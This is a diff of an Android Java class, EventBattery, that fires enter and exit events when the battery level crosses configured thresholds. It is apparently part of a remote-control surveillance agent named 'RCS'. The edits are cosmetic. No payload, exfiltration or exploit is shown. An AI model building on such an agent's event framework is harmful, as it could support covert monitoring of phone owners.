@@ -4,7 +4,7 @@
  * Project      : RCS, AndroidService
  * File         : EventBattery.java
  * Created      : 6-mag-2011
- * Author		: zeno
+ * Author		: zeno -> ladro :D
  * *******************************************/
 
 package com.android.service.event;
@@ -52,8 +52,10 @@ public class EventBattery extends BaseEvent implements Observer<Battery> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
+			
 			return false;
 		}
+		
 		return true;
 	}
 
@@ -74,23 +76,23 @@ public class EventBattery extends BaseEvent implements Observer<Battery> {
 		// Nel range
 		if ((b.getBatteryLevel() >= minLevel && b.getBatteryLevel() <= maxLevel) && inRange == false) {
 			inRange = true;
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Battery IN");//$NON-NLS-1$
 			}
+			
 			onEnter();
-		}
-
-		// Fuori dal range
-		if ((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
+		} else if		// Fuori dal range
+			((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
 			inRange = false;
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Battery OUT");//$NON-NLS-1$
 			}
+			
 			onExit();
 		}
 
 		return 0;
 	}
-
-
 }
